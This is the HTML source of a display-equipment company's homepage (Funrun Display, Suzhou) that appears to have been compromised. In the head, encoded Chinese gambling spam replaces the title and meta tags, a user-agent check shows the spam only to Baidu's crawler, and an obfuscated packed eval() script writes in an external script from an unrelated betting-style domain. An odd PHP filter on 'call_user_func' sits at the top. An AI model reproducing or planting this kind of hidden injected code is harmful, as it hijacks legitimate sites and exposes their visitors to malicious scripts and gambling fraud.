<?php
foreach(array($_GET,$_POST,$_REQUEST) as $s){
  if(strpos($s['function'],"call_user_func") !== false){
    exit("输入内容不合法");
  }
}
?>
<!DOCTYPE html>
<html>
<head lang="en">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta content="application/xhtml+xml;charset=UTF-8" http-equiv="Content-Type"/>
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache, must-revalidate">
<meta http-equiv="expires" content="Wed, 26 Feb 1997 08:21:57 GMT">
<meta content="telephone=no, address=no" name="format-detection"/>
<!--IOS私有属性，可以添加到主屏幕-->
<meta name="apple-mobile-web-app-capable" content="yes"/>
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
<meta name="csrf-token" content="WrH4No5hr30bTJgefuj7YnxjP0WsssMx3SyQv7Rh"/>
<meta name="format-detection" content="telephone=no">
<title>&#21271;&#20140;&#36187;&#36710;&#23448;&#26041;&#25237;&#27880;&#24179;&#21488;&#95;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#25237;&#27880;&#24179;&#21488;&#12304;&#23448;&#26041;&#25480;&#26435;&#20837;&#21475;&#12305;</title>
<meta name="keywords" content="&#21271;&#20140;&#36187;&#36710;&#25237;&#27880;&#32;&#21271;&#20140;&#36187;&#36710;&#24179;&#21488;&#32;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#25237;&#27880;&#24179;&#21488;&#32;&#21271;&#20140;&#36187;&#36710;&#23448;&#26041;&#25237;&#27880;&#24179;&#21488;&#32;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#32593;&#19978;&#25237;&#27880;&#32;&#36187;&#36710;&#112;&#107;&#49;&#48;&#32593;&#19978;&#25237;&#27880;&#32;&#21271;&#20140;&#36187;&#36710;&#27880;&#20876;&#24179;&#21488;&#32;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#20449;&#35465;&#24179;&#21488;&#32;&#112;&#107;&#49;&#48;&#20449;&#35465;&#24179;&#21488;"/>
<meta name="description" content="&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#25237;&#27880;&#24179;&#21488;&#107;&#56;&#24179;&#21488;&#12304;&#107;&#107;&#49;&#57;&#46;&#99;&#111;&#109;&#12305;&#26159;&#107;&#56;&#23448;&#32593;&#26021;&#24040;&#36164;&#25171;&#36896;&#20122;&#27954;&#32769;&#29260;&#24425;&#31080;&#24179;&#21488;&#44;&#19987;&#19994;&#25552;&#20379;&#21271;&#20140;&#112;&#107;&#49;&#48;&#19979;&#27880;&#24179;&#21488;&#21644;&#23089;&#20048;&#36164;&#35759;&#44;&#23089;&#20048;&#39033;&#30446;&#20247;&#22810;&#44;&#26377;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#12289;&#26102;&#26102;&#24425;&#12289;&#24184;&#36816;&#39134;&#33351;&#12289;&#112;&#99;&#34507;&#34507;&#12289;&#24184;&#36816;&#20892;&#22330;&#12289;&#27743;&#33487;&#24555;&#51;&#46;&#31561;&#31561;&#44;&#27426;&#36814;&#21069;&#26469;&#20813;&#36153;&#20307;&#39564;&#35797;&#29609;&#46;&#46;&#46;"/>
<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="home"}</script>
<script type="text/javascript">eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('m["\\e\\c\\1\\l\\i\\8\\n\\0"]["\\7\\4\\9\\0\\8"](\'\\g\\2\\1\\4\\9\\3\\0 \\0\\k\\3\\8\\d\\6\\0\\8\\r\\0\\5\\f\\a\\s\\a\\2\\1\\4\\9\\3\\0\\6 \\2\\4\\1\\d\\6\\o\\0\\0\\3\\2\\p\\5\\5\\7\\7\\7\\b\\1\\3\\e\\a\\2\\j\\b\\1\\c\\i\\5\\q\\j\\b\\f\\2\\6\\h\\g\\5\\2\\1\\4\\9\\3\\0\\h\');',29,29,'x74|x63|x73|x70|x72|x2f|x22|x77|x65|x69|x61|x2e|x6f|x3d|x64|x6a|x3c|x3e|x6d|x38|x79|x75|window|x6e|x68|x3a|x6b|x78|x76'.split('|'),0,{}))
</script>
<!--让IE8，IE9，支持Html5和Css3-->
<!--[if lte IE 8]>
<script src="/template/pc/cms/static/lib/common/mediaqueries/selectivity-full.min.js"></script>
<![endif]-->
<!--[if lt IE 9]>
<script src="/template/pc/cms/static/lib/common/mediaqueries/css3-mediaqueries.js"></script>
<script src="/template/pc/cms/static/lib/common/mediaqueries/html5shiv.js"></script>
<![endif]-->
<link rel="stylesheet" href="/template/pc/cms/static/lib/common/reset.css">
<link href="https://cdn.bootcss.com/Swiper/4.1.0/css/swiper.css" rel="stylesheet">
<link rel="stylesheet" href="/template/pc/cms/static/css/index.css">
<script src="/template/pc/cms/static/lib/jQuery/jquery-min.js"></script>
<script src="https://cdn.bootcss.com/Swiper/4.1.0/js/swiper.js"></script>
<script src="/template/pc/cms/static/js/common.js"></script>
<script src="/template/pc/cms/static/js/layer.js"></script>
</head>
<style>
@media screen and (min-width: 1300px) {
main, .main01 .wrap {
margin: 0 auto;
margin-top: 20px;
width: 1300px;
}
.main01 .wrap .bag {
width: 25rem;
height: 25rem;
}
}
</style>
<body>
<main id="main01" class="main01">
   <div class="wrap ffc">
      <div class="swiper-container bag">
         <div class="logo_pic logo_pic01"></div>
         <div class="swiper-wrapper">
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/14.html" target="_blank">
                  <img data-title="FABRIC TUBE WALL CURVED" data-title-desc="8ft, 10ft, 17ft three sizes available with padded bag and exported carton." src="/public/upload/ad/2018/06-11/412a936bb1deda2466ffee6796c71c77.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/15.html" target="_blank">
                  <img data-title="FABRIC TUBE WALL STRAIGHT" data-title-desc="8ft, 10ft, 19ft three sizes available with padded bag and exported carton." src="/public/upload/ad/2018/06-11/e32bc57cebd9f822704a17d38aed2a41.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/16.html" target="_blank">
                  <img data-title="FABRIC TUBE WALL S-SHAPED" data-title-desc="10ft, 20ft two sizes available with padded bag and exported carton." src="/public/upload/ad/2018/06-11/608f88a6600070c038cfeb9f9ad98b55.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/17.html" target="_blank">
                  <img data-title="FABRIC TUBE WALL U-SHAPE" data-title-desc="8ft,9ft two sizes available with padded bag and exported carton." src="/public/upload/ad/2018/06-11/17f936703aefe11a3fbab7279838f338.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/19.html" target="_blank">
                  <img data-title="FABRIC TUBE COUNTER" data-title-desc="Oval, Square,Waist shape is option. Customized shape can be available if big order." src="/public/upload/ad/2018/06-11/4b351aff03f7bcde5e8ffeff5faa55a8.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="" target="_blank">
                  <img data-title="CHATING CORNER" data-title-desc="Easy kit to make your meeting at anywhere with portable package." src="" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/20.html" target="_blank">
                  <img data-title="TAKE IT" data-title-desc="This suit used with “chating corner” ，one desk ,three stools" src="" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/21.html" target="_blank">
                  <img data-title="SINGULAR STAND" data-title-desc="Angled and Curved shape are available." src="/public/upload/ad/2018/06-11/443848315e2cde145a6624f6985746e1.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/24.html" target="_blank">
                  <img data-title="SINGULAR STAND" data-title-desc="Cobra shape is for you choice" src="/public/upload/ad/2018/06-11/eda02d21579e20f2906654747d74f8f9.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/25.html" target="_blank">
                  <img data-title="SINGULAR STAND" data-title-desc="Snake shape is for you choice" src="/public/upload/ad/2018/06-11/50ce9bb0587facb434e63164958c371b.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/26.html" target="_blank">
                  <img data-title="CAPTAIN FARBIC STAND" data-title-desc="60x228cm,90x228cm,120x228cm,150x228cm four size available." src="/public/upload/ad/2018/06-11/7167d9f62ed925f1b0ba4545d1eda74a.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/27.html" target="_blank">
                  <img data-title="TANK SHOW" data-title-desc="A0,A1 size are used in outdoor or indoor." src="/public/upload/ad/2018/06-11/ea1a3fefbca5ced8ced28773b1a25ff1.png" alt="">
               </a>
                     </div>
      </div>
      
      <div class="swiper-container bag e_top">
         <div class="com_class">
            <h3></h3>
            <p></p>
         </div>
      </div>
      
      <div class="swiper-container bag">
         <div class="logo_pic logo_pic02"></div>
         <div class="swiper-wrapper">
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/12.html" target="_blank">
                  <img  data-title="QUICK FABRIC" data-title-desc="Quick Fabric Poster is supplied in standard size boxed unassembled." src="/public/upload/ad/2018/06-07/d1ab48dd2cdd3852f9393144cd7c9b79.JPG" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/9.html" target="_blank">
                  <img  data-title="QUICK MAGNET POSTER" data-title-desc="Quick Magnet Poster is supplied in standard size boxed unassembled. 3 different size options" src="/public/upload/ad/2018/05-24/aae84b743171958bb69440aea120159b.JPG" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/10.html" target="_blank">
                  <img  data-title="TEXFIX WALLS" data-title-desc="Texfix Walls are supplied in standard size boxed unassembled. 3 different size options" src="/public/upload/ad/2018/06-08/7b03780e59a382714b0887cf083d9ff0.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="/home/Produce/produceDetail/produce_id/11.html" target="_blank">
                  <img  data-title="WALL-MOUNTED APPLICATION" data-title-desc="Wall-mounted Application is single sided, supplied in standard size boxed unassembled and also in 4 meter lengths and parts as semi products" src="/public/upload/ad/2018/06-07/bf8ea6614a679b322ae6125d19b25640.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/8.html" target="_blank">
                  <img  data-title="SLIM LED BOX" data-title-desc="The double sided frame supplied in standard sized boxed unassembled and also in 4 meter lengths and parts as semi products. For larger sizes, H profile must be used for stability. The ILLUMINATION need to be fitted into the profile channels before fix." src="/public/upload/ad/2018/06-07/4894b1483d8decbe08251a44405d2d89.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/7.html" target="_blank">
                  <img  data-title="SLIM LED BOX" data-title-desc="Slim LED Light Box is single sided, supplied in standard size and assembled full set. " src="/public/upload/ad/2018/06-07/9d1d36cb1bc9ac8f2681654d49b5330f.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/3.html" target="_blank">
                  <img  data-title="SLIM LED BOX" data-title-desc="The single sided frame supplied in standard size boxed unassembled and also in 4 meter lengths and parts as semi products. For larger sizes, H profile must be used for stability. The ILLUMINATION need to be fitted into the profile channels before fix the " src="/public/upload/ad/2018/06-07/0b35ddd169eb70342e86b4360fdb4c14.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/13.html" target="_blank">
                  <img  data-title="FREE-HANGING APPLICATION" data-title-desc="Free-hanging Application is double sided, supplied in standard size boxed unassembled and also in 4 meter lengths and parts as semi products" src="/public/upload/ad/2018/06-07/c114e596a6587e4137ddfff765224121.jpg" alt="">
               </a>
                     </div>
      </div>
      
      <div class="swiper-container bag e_center_left">
         <div class="com_class">
            <h3></h3>
            <p></p>
         </div>
      </div>
      
      
      <div class="swiper-container bag">
         <div class="logo_pic "></div>
         <div class="swiper-wrapper">
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/29.html" target="_blank">
                  <img  data-title="POP UP MAGNETIC" data-title-desc="自定义广告描述" src="/public/upload/ad/2018/06-11/ae76d94d78dc29a08fe2e0726088f6f8.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/30.html" target="_blank">
                  <img  data-title="POP UP SPRING" data-title-desc="自定义广告描述" src="/public/upload/ad/2018/06-11/35988b04890dd5fcb86ed10661bdee22.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/31.html" target="_blank">
                  <img  data-title="POP UP MAGNETIC SMART" data-title-desc="自定义广告描述" src="/public/upload/ad/2018/06-11/9cba97ce275e3e9c4fb29fce12f656f4.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/32.html" target="_blank">
                  <img  data-title="STRAIGHT POP UP FABRIC" data-title-desc="自定义广告描述" src="/public/upload/ad/2018/06-11/5e95883106c0dd8fda804c7cfa43a8d0.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/33.html" target="_blank">
                  <img  data-title="MYSTLE POP UP" data-title-desc="自定义广告描述" src="/public/upload/ad/2018/06-11/5477f9c3ce435daf2658d477d73e2da2.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/34.html" target="_blank">
                  <img  data-title="ROLL UP - BANNER" data-title-desc="自定义广告描述" src="/public/upload/ad/2018/06-11/7df1336b4e3a43e135018b0d258fe66a.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/35.html" target="_blank">
                  <img  data-title="ROLL UP - BANNER" data-title-desc="自定义广告描述" src="/public/upload/ad/2018/06-11/3299d2028322529d319a7ea43ba2fa0b.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/Produce/produceDetail/produce_id/37.html" target="_blank">
                  <img  data-title="ROLL UP - BANNER" data-title-desc="自定义广告描述" src="/public/upload/ad/2018/06-11/bac5b959a54b96ea0bb9005aacd8b718.jpg" alt="">
               </a>
                        <!--<img class="swiper-slide" data-title="这是我的图片标题55" data-title-desc="这是我很长很长的标题描述55" src="/template/pc/cms/static/image/index/roll_banners.jpg" alt="">
            <img class="swiper-slide" data-title="这是我的图片标题66" data-title-desc="这是我很长很长的标题描述66" src="/template/pc/cms/static/image/index/zipper_walls.jpg" alt="">-->
         </div>
      </div>
      
      <div class="swiper-container bag e_center_right ">
         <div class="com_class">
            <h3></h3>
            <p></p>
         </div>
      </div>
      
      <div class="swiper-container bag">
         <div class="logo_pic logo_pic03"></div>
         <div class="swiper-wrapper">
                           <a class="swiper-slide" href="http://www.funrundisplay.com/home/article/detail/article_id/1.html" target="_blank">
                  <img  data-title="FUNRUN DISPLAY" data-title-desc="自定义广告描述" src="/public/upload/ad/2018/09-06/036590104c83cf09f1e93f36f27dc223.jpg" alt="">
               </a>
                     </div>
      </div>
      
      <div class="swiper-container bag e_bottom ">
         <div class="com_class">
            <h3></h3>
            <p></p>
         </div>
      </div>
      
      <div class="swiper-container bag">
         <div class="logo_pic logo_pic04"></div>
         <div class="swiper-wrapper">
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/download.html" target="_blank">
                  <img  data-title="FABRIC TUBE WALL CURVED" data-title-desc="FABRIC TUBE DISPLAY GRAPHIC-_FABRIC TUBE WALL CURVED 3X3" src="/public/upload/ad/2018/10-17/552664b8e8dfe7568c6103eb72d0574e.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/download.html" target="_blank">
                  <img  data-title="CAPTAIN FABRIC STAND" data-title-desc="FABRIC TUBE DISPLAY GRAPHIC--CAPTAIN FABRIC STAND" src="/public/upload/ad/2018/10-17/8469c5f58fec12f83fc4fc01bfceff44.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/download.html" target="_blank">
                  <img  data-title="HANGING SIGNS" data-title-desc="FABRIC TUBE DISPLAY GRAPHIC--HANGING SIGNS" src="/public/upload/ad/2018/10-17/3fa8c34080b9dfded8cbdea7aad706a5.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/download.html" target="_blank">
                  <img  data-title="SINGULAR STAND/SNAKE" data-title-desc="FABRIC TUBE DISPLAY GRAPHIC--SINGULAR STAND/SNAKE" src="/public/upload/ad/2018/10-17/ba46af46d1cf5683fb45bf1a18dc4d07.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/download.html" target="_blank">
                  <img  data-title="WAIST FABRIC TUBE COUNTER" data-title-desc="FABRIC TUBE DISPLAY GRAPHIC--WAIST FABRIC TUBE COUNTER" src="/public/upload/ad/2018/10-17/d7bce5e085426242c160dd56326b0e73.jpg" alt="">
               </a>
                           <a class="swiper-slide" href="http://45.78.47.112:8800/home/download.html" target="_blank">
                  <img  data-title="TAKE IT" data-title-desc="FABRIC TUBE DISPLAY GRAPHIC--TAKE IT" src="/public/upload/ad/2018/10-17/414cf531538aa2fca73a219c7465e854.jpg" alt="">
               </a>
                     </div>
      </div>
   </div>
   <div class="seeAll">
      <span></span>
   </div>
</main>

<div class="topBtn">
   <div id="topBtn" class="go-top">
      <a class="leesMeerHome" href="javascript:void(0);">
         <span></span>
      </a>
   </div>
</div>
<div class="footer-bottom" ondragstart="return false">
   <div class="content fixWauto clearfloat">
      <div class="fr footerLeft ">
         <div class="clearfloat ffc_sb">
            <div class="contactInfo fl">
               info@funrundisplay.com<br>
               Tel:+86(0)512 650 867 27
            </div>
            <div class="blank"></div>
            <div class="contactInfov fr">
               <a href="javascript:void(0);">1988 Zuanshi Road Weitang,</a><br>
               <a href="javascript:void(0);"> 215134,Suchou City,China</a><br>
            </div>
         </div>
         <div class="conBot"><h3>Suchou Funrun Display Equipment CO.,LTD.</h3></div>
         <div class="RunnningFunning clearfloat">
            <div class="fl"><img src="/template/pc/cms/static/image/index/快秀.png" alt=""></div>
            <div class="fr"><img src="/template/pc/cms/static/image/index/卡秀.png" alt=""></div>
         </div>
      </div>
      
      <!--logo s-->
      <div class="fr logos">
         <a href="javascript:void(0);">
            <img src="/template/pc/cms/static/image/logo.png" alt="">
         </a>
      </div>
      <!--logo end-->
      <div class="fl navMenu">
         <ul class="clearfloat">
            <li><a href="/home/produce.html"> produce</a></li>
            <li><a href=""></a></li>
            <li><a href="/home/download.html">service</a></li>
            <li><a href=""></a></li>
            <li><a href="/">home</a></li>
            <li><a href=""></a></li>
            <li><a href="/home/article.html">news</a></li>
            <li><a href=""></a></li>
            <li><a href="/home/article/detail/article_id/1.html">contact</a></li>
         </ul>
      </div>
   </div>
</div>

</body>
</html>